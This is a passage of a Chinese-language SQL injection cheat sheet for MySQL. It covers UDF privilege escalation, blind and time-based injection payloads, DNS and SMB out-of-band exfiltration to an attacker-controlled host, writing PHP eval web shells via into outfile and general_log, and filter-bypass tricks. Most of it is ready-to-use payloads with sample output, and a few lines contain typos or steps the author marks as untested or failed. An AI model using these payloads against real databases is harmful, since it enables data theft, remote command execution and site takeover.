<p>+—————-+——————————————+<br>|Variable_name   | Value                                    |<br>+—————-+——————————————+<br>| plugin_dir     |c:\mysql\mysql server 5.1\lib/plugin      |<br>+—————-+——————————————+</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select unhex(&apos;udf.dll hex code&apos;) into dumpfile &apos;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&apos;;</span><br><span class="line">mysql&gt; select * from func; #查看是否有人创建过udf 如果有就可以省略</span><br><span class="line">mysql&gt; create function MyCmd returns string soname &apos;&apos;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&apos;;</span><br><span class="line">mysql&gt; select MyCmd(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure>
<p><del>本地复现没有成功</del></p>
<p>一点小知识点:</p>
<p>如何获取该udf.dll文件的16进制值(hex)?<br>我们可以本地搭建mysql环境，找个可以用的udf.dll文件 、，行下面操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(load_file (&apos;c:/windows/temp/xxoo.dll&apos;)) into outfile &apos;c:/windows/temp/xxoo.txt&apos;;</span><br></pre></td></tr></table></figure></p>
<h3 id="0x06-盲注"><a href="#0x06-盲注" class="headerlink" title="0x06 盲注"></a>0x06 盲注</h3><hr>
<h4 id="1-相关函数："><a href="#1-相关函数：" class="headerlink" title="1.相关函数："></a>1.相关函数：</h4><p>①length():返回字符串的长度<br>②substr():截取字符串<br>substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。<br>③ascii():返回字符的ascii码<br>④if():<br>If(exor1,expr2,expr3)在mysql中是第一个参数成立的时候执行第二个参数，否则执行第三个参数</p>
<h4 id="2-布尔型盲注："><a href="#2-布尔型盲注：" class="headerlink" title="2.布尔型盲注："></a>2.布尔型盲注：</h4><p>(1).截断函数<br>mid()<br>left()<br>(2).正则匹配<br>regexp()<br>like<br>(3).判断函数<br>ifnull(expr1,expr2)<br>利用and or的逻辑判断 通过判断页面是否正常回显，来判断<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (left((select database()),1))=&quot;a&quot; --+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select database() regexp &apos;^ad&apos;)=1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select sleep(10) from admin where user like &quot;%r%&quot; limit 1,1)</span><br></pre></td></tr></table></figure>
<h4 id="3-时间型盲注实际操作："><a href="#3-时间型盲注实际操作：" class="headerlink" title="3.时间型盲注实际操作："></a>3.时间型盲注实际操作：</h4><p>①判断注入点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; or sleep(5) --+</span><br></pre></td></tr></table></figure>
<p>②爆库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(Ascii(substr(select schema_name from information_schema.schemata limit 0,1),1,1))=100,sleep(),null)as name</span><br></pre></td></tr></table></figure>
<p>③爆表<br>④爆字段<br>⑤爆数据<br>都是一样的套路</p>
<p>Tips：<br>substr()的小技巧：例如在substr(database(),1,1)中逗号被过滤了，我们可以使用from 1 to 1来绕过过滤。<br>那么有同样格式的limit 0,1有没有这样的绕过呢？当然有。格式为：1 offset 0这里注查询数字的顺序</p>
<p>也可以这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select sleep(find_in_set(mid(@@version,1,1),&apos;0,1,2,3,4,5,6,7,8,9,.&apos;));</span><br><span class="line">select sleep(find_in_set(mid(@@version,1,2),&apos;0,1,2,3,4,5,6,7,8,9,.&apos;));</span><br></pre></td></tr></table></figure></p>
<p>推荐使用sleep而不要使用benchmark，因为sleep不会占用cpu而且比较稳定。<br>几个函数：<br>mid():用于从文本字段中提取字符 SELECT MID(column_name,start[,length]) FROM table_name;<br>find_in_set():在目标字符串中查找子字符串<br>locate():返回子串 substr 在字符串 str 中第一次出现的位置<br>比如有一个2个记录的表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from test;</span><br><span class="line">    +----------+</span><br><span class="line">    | count(*) |</span><br><span class="line">    +----------+</span><br><span class="line">    |        2 |</span><br><span class="line">    +----------+</span><br></pre></td></tr></table></figure>
<p>如果直接查询，因为两个记录都会引发查询所以会触发两次sleep()延迟12秒</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from test where sleep(locate(mid(@@version, 1, 1), &apos;0123456789.&apos;));</span><br><span class="line">Empty set (12.00 sec)</span><br></pre></td></tr></table></figure>
<p>这里在前面使用一个条件语句，因为and前面的表达式如果为false则后面的不执行，所以sleep执行一次，延迟6秒</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from test where a=1 and sleep(locate(mid(@@version, 1, 1), &apos;0123456789.&apos;));</span><br><span class="line">Empty set (6.00 sec)</span><br></pre></td></tr></table></figure>
<h4 id="3-关于盲注的更多扩展："><a href="#3-关于盲注的更多扩展：" class="headerlink" title="3.关于盲注的更多扩展："></a>3.关于盲注的更多扩展：</h4><p><strong>使用位运算进行盲注：</strong><br>ord():以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值，如果所给的 Unicode 字符超出了你的 Python 定义范围，则会引发一个 TypeError 的异常。<br>我们主要使用与运算，它的原理是每次请求确定二进制的一位，对于ascii码连续的区间时间复杂度为log(n)*length，所以相对于二分查找，它应用起来比较有局限性。<br>位与运算符 ( &amp; ) ：对应的二进制位都为 1 ，则该位的运算结果为 1 ，否则为 0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ord(&apos;a&apos;) &amp; 1;</span><br><span class="line">+--------------+</span><br><span class="line">| ord(&apos;a&apos;) &amp; 1 |</span><br><span class="line">+--------------+</span><br><span class="line">|            1 |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select ord(&apos;a&apos;) &amp; 2;</span><br><span class="line">+--------------+</span><br><span class="line">| ord(&apos;a&apos;) &amp; 2 |</span><br><span class="line">+--------------+</span><br><span class="line">|            0 |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select ord(&apos;a&apos;) &amp; 117;</span><br><span class="line">+----------------+</span><br><span class="line">| ord(&apos;a&apos;) &amp; 117 |</span><br><span class="line">+----------------+</span><br><span class="line">|             97 |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h4 id="4-不同的时间盲注的五种方法"><a href="#4-不同的时间盲注的五种方法" class="headerlink" title="4.不同的时间盲注的五种方法"></a>4.不同的时间盲注的五种方法</h4><h5 id="1-sleep"><a href="#1-sleep" class="headerlink" title="(1).sleep()"></a>(1).sleep()</h5><h5 id="2-benchmark"><a href="#2-benchmark" class="headerlink" title="(2).benchmark()"></a>(2).benchmark()</h5><h5 id="3-笛卡儿积"><a href="#3-笛卡儿积" class="headerlink" title="(3).笛卡儿积"></a>(3).笛卡儿积</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+------------+</span><br><span class="line">| count(*)   |</span><br><span class="line">+------------+</span><br><span class="line">| 2651020120 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (1 min 51.05 sec)</span><br></pre></td></tr></table></figure>
<h5 id="4-GET-LOCK"><a href="#4-GET-LOCK" class="headerlink" title="(4).GET_LOCK"></a>(4).GET_LOCK</h5><p>GET_LOCK(str,timeout):<br>试图分配一个名为name，超时时间为timeout秒的锁。timeout为负数时表示永不超时。该锁是独立的，即当有一个连接在使用名为str的锁时，其他的连接无法获得该锁。<br>1:获得成功； 0:获取超时（比如有其他客户端已经锁住了该锁）； NULL:发生错误（比如内存溢出或者线程被mysqladmin杀掉了）。<br>延时精确可控，利用环境有限，需要开两个session测试。</p>
<blockquote>
<p>官方解释:<br>GET_LOCK(str,timeout)</p>
</blockquote>
<p>Tries<br>to obtain a lock with a name given by the string str, using a timeout of<br>timeout seconds. A negative timeout value means infinite timeout. The lock is<br>exclusive. While held by one session, other sessions cannot obtain a lock of<br>the same name.</p>
<p>SESSION A<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&apos;test&apos;,1);</span><br><span class="line">+--------------------+</span><br><span class="line">| get_lock(&apos;test&apos;,1) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>SESSION B<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&apos;test&apos;,5);</span><br><span class="line">+--------------------+</span><br><span class="line">| get_lock(&apos;test&apos;,5) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (5.00 sec)</span><br></pre></td></tr></table></figure></p>
<h5 id="5-RLIKE"><a href="#5-RLIKE" class="headerlink" title="(5).RLIKE"></a>(5).RLIKE</h5><p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。<br>RPAD(str,len,padstr)<br>用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len，那么它将被截除到 len个字符。<br>用 regexp ，rlike 或者 not rlike，三个关键字都可以实现，在关键字后加’’，里面直接写正则表达式就可以了,而like后面是跟通配符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;) |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">|                                                           0 |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row in set (5.27 sec)</span><br></pre></td></tr></table></figure>
<p><strong>其他位置的注入</strong><br>1.Get、Post<br>2.UA头<br>3.referer头<br>4.cookie</p>
<h3 id="0x07-外带通道注入"><a href="#0x07-外带通道注入" class="headerlink" title="0x07 外带通道注入"></a>0x07 外带通道注入</h3><hr>
<blockquote>
<p>使用背景：<br>在进行sql注入攻击的时候我们经常会遇见无回显的情况，那我们就不能进行注入了么？<br>其实攻击可能已经成功了，But应用程序未返回任何结果，使你误以为攻击失败。<br>一种获取数据的有效方法是使用带外通道<br>能够在数据库中执行任意SQL语句后,我们可以利用数据的一些内置功能在数据库与自己的计算机直接建立网络连接,通过它传送从数据库中收集的任何信息<br>一般可以提取数据的途径:<br>通过HTTP(S)请求、DNS剖析、文件系统、电子邮件等等<br>对于MySQL而言<br>同样和文件读写一样，需要secure_file_priv这个全局变量控制的权限，具体见上文中对该变量的介绍。<br>利用条件：</p>
</blockquote>
<p>全局变量secure_file_priv = ‘ ‘<br>可以用SQL server连接到mysql数据库</p>
<p><strong>基础的知识</strong><br>DNS解析原理</p>
<p><strong>使用DNS解析提取数据</strong><br>条件：skip_name_resolve为off，MySQL支持DNS解析<br>在mysql中会对查询语句中的ip和网址尝试DNS解析。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(‘\\\\’,version()’yoursite.com\\a.txt’));		//读取文件操作</span><br></pre></td></tr></table></figure></p>
<p>SELECT…INTO OUTFILE 命令可将任意一个查询的输出指向一个文件<br>如：<br>要想收到文件必须要在计算机上建立SMP共享允许匿名写入访问。<br>如果无法接受到文件可能是由于smb服务器的配置有问题<br>然后我们可以通过抓包看MySql发出的DNS查询数据<br>或者使用网上现成的<a href="http://dnsbin.zhack.ca/" target="_blank" rel="noopener">http://dnsbin.zhack.ca/</a> 就可以看到mysql发送过来的数据<br>SELECT…INTO OUTFILE 命令可将任意一个查询的输出指向一个文件<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * into outfile &apos;\\\\xxxx.com\\share\\output.txt&apos; from users;</span><br></pre></td></tr></table></figure></p>
<p>要想收到文件必须要在计算机上建立SMB共享允许匿名写入访问。<br>如果无法接受到文件可能是由于smb服务器的配置有问题(139端口打开)</p>
<p>可以使用  ||, or, |, and, &amp;&amp;, &amp;, &gt;&gt;, &lt;&lt;, ^, xor, &lt;=, &lt;, &lt;=&gt;,&gt;, &gt;=, mul, /, div,<br>-, +, %<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set username=&apos;l0ca1&apos;*load_file(concat(&apos;\\\&apos;,version(),&apos;.l0ca1.com\\a.txt&apos;)) where id=1</span><br></pre></td></tr></table></figure></p>
<h3 id="0x08-SMB-Relay注入攻击"><a href="#0x08-SMB-Relay注入攻击" class="headerlink" title="0x08 SMB Relay注入攻击"></a>0x08 SMB Relay注入攻击</h3><hr>
<p>以后补全</p>
<h3 id="0x09-order-by注入"><a href="#0x09-order-by注入" class="headerlink" title="0x09 order by注入"></a>0x09 order by注入</h3><hr>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user,host from mysql.user order by 1 and updatexml(1,if(1=1,user(),2),1)</span><br></pre></td></tr></table></figure>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user,host from mysql.user order by if(1=1,sleep(2),1);</span><br></pre></td></tr></table></figure>
<h4 id="改变返回数据"><a href="#改变返回数据" class="headerlink" title="改变返回数据"></a>改变返回数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select .... order by id|2 //由此来改变返回的数据的顺序 变化之后 他进行的操作是将i</span><br><span class="line">d的值进行按位或在进行排序</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select .... order by id|(boolean payload)+1 /由此变化为布尔盲注</span><br></pre></td></tr></table></figure>
<p>不太理解此处是如何报错的</p>
<p>写shell，一般报错注入无法写入shell，所以可以使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select test from test where id=1 into outfile &quot;C:\www\xx.php&quot; lines terminated by &apos;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&apos;	//可用于where,order by,limit之后</span><br></pre></td></tr></table></figure></p>
<h3 id="0x10-limit注入"><a href="#0x10-limit注入" class="headerlink" title="0x10 limit注入"></a>0x10 limit注入</h3><hr>
<h4 id="1-可以使用union-select"><a href="#1-可以使用union-select" class="headerlink" title="1.可以使用union select"></a>1.可以使用union select</h4><h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from mysql.user order by 1 limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);	//仅限于limit后</span><br></pre></td></tr></table></figure>
<h3 id="0x11-提权"><a href="#0x11-提权" class="headerlink" title="0x11 提权"></a>0x11 提权</h3><p>首先udf(user defined function)是用户自定义函数，思路及上传udf.dll 添加shell函数，去执行系统<br>命令。<br>要注意几点:</p>
<ol>
<li>mysql4.1­5.1版本中 在添加函数时，对udf.dll的位置做出限制 不能出现”/”,”\”符号，及无法使<br>用绝对路径。</li>
<li>mysql5.1后再次对位置做出了限制,上传的udf.dll必须在mysql/lib/plugin/目录下，但是plugin<br>默认是不存在的。</li>
</ol>
<p><strong>mysql信息收集</strong><br>版本号 version()<br>mysql目录的绝对路径 @@basedir<br>上传udf,dll<br>最终目标是将udf.dll上传至mysql/lib/plugin下<br>所以先测试此目录是否可创建目录 上传文件。<br>如果此目录无法完成,寻找可上传点，上传udf.dll，最后通过select load_file(‘C:/www/udf.dll’)</p>
<h4 id="上传udf-dll"><a href="#上传udf-dll" class="headerlink" title="上传udf.dll"></a>上传udf.dll</h4><p>最终目标是将udf.dll上传至mysql/lib/plugin下<br>所以先测试此目录是否可创建目录 上传文件。<br>如果此目录无法完成,寻找可上传点，上传udf.dll，最后通过select load_file(‘C:/www/udf.dll’)<br>into dumpfile ‘C:/mysql/lib/plugin/udf.dll’ 将udf.dll上传至目的地，中间会遇到plugin不存在的<br>问题，可以通过NTFS ADS流创建文件夹，语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select &apos;test&apos; into dumpfile &apos;C:/Program Files/phpStudy/MySQL/lib::INDEX_A</span><br><span class="line">LLOCATION&apos;;</span><br><span class="line">select &apos;test&apos; into dumpfile &apos;C:/Program Files/phpStudy/MySQL/lib/plugin::</span><br><span class="line">INDEX_ALLOCATION&apos;; //测试失败-_-,一定几率成功</span><br></pre></td></tr></table></figure>
<h4 id="添加函数"><a href="#添加函数" class="headerlink" title="添加函数"></a>添加函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function shell returns strings soname &apos;udf.dll&apos;</span><br></pre></td></tr></table></figure>
<h4 id="root权限写木马"><a href="#root权限写木马" class="headerlink" title="root权限写木马"></a>root权限写木马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;0x+hex(xx.exe)&apos; into dumpfile &apos;C:/xxx.exe&apos;</span><br></pre></td></tr></table></figure>
<h4 id="提权姿势"><a href="#提权姿势" class="headerlink" title="提权姿势"></a>提权姿势</h4><p>phpmyadmin getshell</p>
<p>在into outfile被禁用，尝试登陆phpmyadmin进行getshell(mysql为root权限)：<br>利用general log file,general log是记录mysql所有操作的操作日志，利用此日志去写入shell。<br>步骤：</p>
<ol>
<li>#general 为ON        <code>show variables like &#39;%general%&#39;;</code><br> 若要打开:<code>set global general_log=on;</code></li>
<li>在全局变量中设置general log file地址（将其设置在网站目录下 如：<br> C:\phpstudy\www\shell.php 则以后执行的语句都将记录在此文件下）<br> 指定输出的log存放在表里面:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global log_output=&apos;table&apos;;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>3.执行语句:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET names &apos;utf8&apos; COLLATE &apos;utf8_general_ci&apos;;</span><br><span class="line">SET names &apos;utf8&apos; collate &apos;utf8_general_ci&apos;;</span><br><span class="line">select &lt;?php phpinfo() ?&gt;;</span><br></pre></td></tr></table></figure></p>
<h3 id="0x12-移位溢注技术"><a href="#0x12-移位溢注技术" class="headerlink" title="0x12 移位溢注技术"></a>0x12 移位溢注技术</h3><hr>
<p>知道表名不清楚列的情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1,2,admin.* from  admin //根据回显位来调整位置</span><br></pre></td></tr></table></figure>
<p>1.由原语句：union select 1,2,3,..,p..,n-k,<em> from TABLE 可以得出该联合查询的目的是构造和原网站相同列数的查询结构，使得页面上可以显示对应的数字；这条语句相当于是做了两次查询并将它们的结果合并，第一次做了select 1,2,3,..,n-k from TALBE ，第二次做了select </em> from TALBE ，然后将它们的结果合并。<br>2.只要满足原理1的要求，保障联合查询的结果和原网站查询的结果列数一致即可；因此可以将TALBE.*向前移动至页面显示的数字处来爆出TALBE列中的内容。<br>即:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1,admin,2.* from admin</span><br></pre></td></tr></table></figure></p>
<p>如果MYSQL小于5.0的情况下所具备的条件和ACCESS一样，也可以使用此方法注入，如果是MYSQL大于5.0的版本，使用此方法可以省去获得列名的步骤。</p>
<p>结合join查询法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(selec</span><br><span class="line">t 4)d union select * from test.a)e; //from后面的表结合做笛卡尔积运算， (selec</span><br><span class="line">t 1)a是将（select 1）的结果用别名a来代替 相当与(select 1) as a</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=1 union select (select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d</span><br><span class="line">union select * from user)e limit 1 offset 3)f,(select 1)g,(select 1)h,(select 1)i;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>id</th>
<th>username</th>
<th>password</th>
<th>email</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>admin</td>
<td>admin888</td>
<td><a href="mailto:110@110.com" target="_blank" rel="noopener">110@110.com</a></td>
</tr>
<tr>
<td><a href="mailto:120@120.com" target="_blank" rel="noopener">120@120.com</a></td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>————-</td>
<td>———-</td>
<td>———-</td>
<td>————-</td>
</tr>
</tbody>
</table>
<h3 id="0x13-特别报错"><a href="#0x13-特别报错" class="headerlink" title="0x13 特别报错"></a>0x13 特别报错</h3><hr>
<p>在限制了information_schema,columns,tables等情况下获取一些爆破信息</p>
<ol>
<li>字段重复爆出字段<br> select num from test.a where id=1 and (select <em> from (select </em> from a as<br> a join a as b)as c) //导致c字段重复</li>
<li>利用polygon()函数 在已知字段的情况下爆出表名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select num from a where id=1 and polygon(id);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>3.使用不存在函数 爆出数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select num from a where id=1-a();</span><br></pre></td></tr></table></figure></p>
<h3 id="0x14-简单绕过技巧"><a href="#0x14-简单绕过技巧" class="headerlink" title="0x14 简单绕过技巧"></a>0x14 简单绕过技巧</h3><hr>
<h4 id="1-注释符："><a href="#1-注释符：" class="headerlink" title="1.注释符："></a>1.注释符：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#， </span><br><span class="line">-- X(X为任意字符)</span><br><span class="line">/*(MySQL-5.1)</span><br><span class="line">;%00</span><br><span class="line">`</span><br><span class="line">&apos;or 1=1;%00</span><br><span class="line">&apos;or 1=1 union select 1,2`&apos;</span><br><span class="line">&apos;or 1=1 #</span><br><span class="line">&apos;/*!50000or*/ 1=1 -- -      //版本号为5.1.38时只要小于50138</span><br><span class="line">&apos;/*!or*/ 1=1 -- -</span><br></pre></td></tr></table></figure>
<h4 id="2-前缀："><a href="#2-前缀：" class="headerlink" title="2.前缀："></a>2.前缀：</h4><p>任意混合 + - ~ !</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or --+2=- -!!!&apos;2</span><br></pre></td></tr></table></figure>
<p>测试后发现and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or- -!!!1=1；</span><br></pre></td></tr></table></figure>
<h4 id="3-运算符："><a href="#3-运算符：" class="headerlink" title="3.运算符："></a>3.运算符：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, &lt;, &gt;, &lt;&lt;, &gt;&gt;, &gt;=, &lt;=, &lt;&gt;, &lt;=&gt;, XOR,DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN,……</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or 1 rlike &apos;1</span><br></pre></td></tr></table></figure>
<h4 id="4-空格"><a href="#4-空格" class="headerlink" title="4.空格"></a>4.空格</h4><blockquote>
<p>09 Horizontal Tab<br>0A New Line<br>0B Vertical Tab<br>0C New Page<br>0D Carriage Return<br>A0 Non­breaking Space<br>20 Space<br>使用():select(id)from(a);<br>使用/<em> ! select</em>/&amp;&amp;select/<strong>/from<br>‘or+(1)sounds/</strong>/like”1”–%a0-</p>
</blockquote>
<h4 id="5-不用逗号"><a href="#5-不用逗号" class="headerlink" title="5.不用逗号"></a>5.不用逗号</h4><p>基于时间的盲注：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when xxx then sleep() else xxxx;</span><br></pre></td></tr></table></figure>
<p>对于substr和mid:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(data from 1 for 1);</span><br><span class="line">mid(data from 1 for 1);</span><br></pre></td></tr></table></figure></p>
<p>使用like<br>在过滤逗号的情况下使用union查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from teat.a union select * from (select 1)a join (select 2)b join (select 3) c ;</span><br></pre></td></tr></table></figure></p>
<p>join对表进行了操作，所以建立了虚表以供操作</p>
<h4 id="6-不用引号"><a href="#6-不用引号" class="headerlink" title="6.不用引号"></a>6.不用引号</h4><p><li>hex编码</li></p>
<p><li>char()<br>e.g.:</li></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">table_schema=&quot;test&quot;换为</span><br><span class="line">table_schema=0x74657374</span><br></pre></td></tr></table></figure>
<h4 id="7-过滤where"><a href="#7-过滤where" class="headerlink" title="7.过滤where"></a>7.过滤where</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.tables group by table_schema having table_schema=&quot;a&quot;;</span><br></pre></td></tr></table></figure>
<h4 id="8-过滤having"><a href="#8-过滤having" class="headerlink" title="8.过滤having"></a>8.过滤having</h4><p><code>&#39;and(select substr(group_concat(pass),1,1)from users)=&#39;a</code></p>
